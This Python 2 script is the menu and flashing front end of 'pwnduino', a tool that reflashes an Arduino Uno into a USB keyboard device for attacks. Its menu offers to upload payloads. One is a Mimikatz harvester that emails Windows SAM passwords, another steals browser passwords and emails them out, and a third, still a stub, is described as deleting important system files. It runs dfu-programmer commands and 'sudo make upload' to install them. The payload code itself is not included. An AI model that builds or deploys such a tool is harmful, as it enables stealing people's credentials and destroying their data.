############## Python Modules ##############
import os, sys, argparse, signal, warnings, serial, platform
import serial.tools.list_ports # obtain a list of arduinos present on serial ports.
from time import sleep # Delay
from getpass import getpass # Prevent the password from being shown.

############## ############## ##############


############## Global Color Vars ##############

# Standard Colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
LR = '\033[1;31m' # light red
LG = '\033[1;32m' # light green
LO = '\033[1;33m' # light orange
LB = '\033[1;34m' # light blue
LP = '\033[1;35m' # light purple
LC = '\033[1;36m' # light cyan

# FAIL and SUCCESS
MISSING = "[" + R + "MISSING!" + W + "]"
FOUND = "[" + G + "FOUND" + W + "]"


header1 = """

                ..:::::::::..
           ..:::aad8888888baa:::..
        .::::d:?88888888888?::8b::::.
      .:::d8888:?88888888??a888888b:::.
    .:::d8888888a8888888aa8888888888b:::.
   ::::dP::::::::88888888888::::::::Yb::::
  ::::dP:::::::::Y888888888P:::::::::Yb::::
 ::::d8:::::::::::Y8888888P:::::::::::8b::::
.::::88::::::::::::Y88888P::::::::::::88::::.
:::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
:::::::Y88888888888P::|::Y88888888888P:::::::
::::::::::::::::888:::|:::888::::::::::::::::
`:::::::::::::::8888888888888b::::::::::::::'
 :::::::::::::::88888888888888::::::::::::::
  :::::::::::::d88888888888888:::::::::::::
   ::::::::::::88::88::88:::88::::::::::::
    `::::::::::88::88::88:::88::::::::::'
      `::::::::88::88::P::::88::::::::'
        `::::::88::88:::::::88::::::'
           ``:::::::::::::::::::''
                ``:::::::::''

          ------------------------
            Welcome to pwnduino!
          Pick Your Poison WISELY!
          ------------------------

        Developed By: the pwnduino team
        OS Version: {}
        Thanks: @SamyKamkar @Screetsec !

""".format(platform.platform())

############## ############## ##############


############## Interrupt Handler ##############
def handler(signal, frame):
    sys.exit(R + "\nInterrupted! Stopping..." + W)

signal.signal(signal.SIGINT, handler)
############## ############## ##############



########################### Main Methods ###########################

def checkArduino():

    print LC + " Please insert your Arduino Uno. Press Enter to continue" + W
    raw_input()



    arduino_ports = [
        p.device
        for p in serial.tools.list_ports.comports()
        if 'Arduino' in p.description
    ]

    if not arduino_ports:
        print LR + "[!] No Arduino Found! [!]"
        print "If Arduino is a HID, it will not be detected." + W
        sleep(1.5)
    else:
        ser = serial.Serial(arduino_ports[0])
        print G + "[*] Arduino Found! Entering Main Menu...[*]" + W
        sleep(1.5)

    if len(arduino_ports) > 1:
        warnings.warn(LY + 'Multiple Arduinos found - using the first' + W)


def usbserial():
    print O + "[*] On the Arduino, please short GND and ICSP header pin. Press Enter once completed [*]"
    enter = raw_input()
    print O + "[*] Performing Initial Flashing... [*]" + W
    os.system("dfu-programmer atmega16u2 erase")
    os.system("cd src && dfu-programmer atmega16u2 flash --debug 1 Arduino-usbserial.hex")
    os.system("dfu-programmer atmega16u2 reset")
    print LG + "[!] Done! Unplug your boring regular " + LB + "Arduino Uno" + LG + " and do some regular stuff  " + W
    raw_input(C + "[Enter to Continue]" + W )
    print ""

def upload():
    while True:
        print ""
        print "-------------------------------------------------"
        print LP + "[1]" + W + " Mimikatz Cred Harvester (thanks Screetsec!)"
        print "sends passwords from SAM to specified email"
        print "-------------------------------------------------"
        print LP + "[2]" + W + " WebbrowserPassView Cred Harvester"
        print "steals web browser passwords and sends to specified email"
        print "-------------------------------------------------"
        print LP + "[3]" + W + " Scr1pt_k1dd13.exe"
        print "a stupid script that deletes important system files"
        print "-------------------------------------------------"

        script = raw_input(LC + "[>] Which script? " + W )

        if script == "1":
            print "Uploading..."
            break
        elif script == "2":
            print "Please make sure that a proper email/SMTP address is configured in webbrowser.ino"
            email = raw_input("> What is the email address?")
            password = getpass("> What is the password (NOT ECHOED) ")

            print "Uploading..."
            os.system("cd hid/webbrowser && sudo make upload")
            print "Done"
            break
        elif script == "3":
            print LR + "Not yet..." + W
            continue

def keyboardflash():
    print LB + "Flashing Arduino into HID Keyboard Device..." + W
    print LO + "[*] On the Arduino, please short GND and ICSP header pin. Press Enter once completed [*]" + W
    enter = raw_input()
    os.system("dfu-programmer atmega16u2 erase")
    os.system("cd src/ && dfu-programmer atmega16u2 flash --debug 1 Arduino-keyboard.hex")
    os.system("dfu-programmer atmega16u2 reset")
    print LG + "[!] Done! Unplug your brand-new " + LB + "pwnduino" + LG + " and Hack the Gibson!" + W
    raw_input(C + "[Enter to Continue]" + W )
    print ""

##########################################################################################################



while True:
    print header1 + LC
    print "====================================="
    print "1. Detect Arduino"
    print "2. Flash Arduino into Serial device"
    print "3. Upload pwnduino malicious script"
    print "4. Flash Arduino into HID"
    print "====================================="
    print "" + B
    print "====================================="
    print "5. Complete Arduino Flash"
    print "=====================================" + W

    flash = raw_input(LG + "(>) Select Option: " + W )
    if flash == "1":
        checkArduino()
    elif flash == "2":
        usbserial()
    elif flash == "3":
        upload()
    elif flash == "4":
        keyboardflash()
    elif flash == "5":
        usbserial()
        upload()
        keyboardflash()
        scriptupload = raw_input(LO +"Would you like to upload a script? (y/n) " + W)
        if scriptupload == "y":
            upload()
        elif scriptupload == "n":
            continue
    else:
        print LR + "Did not get that!" + W
        continue
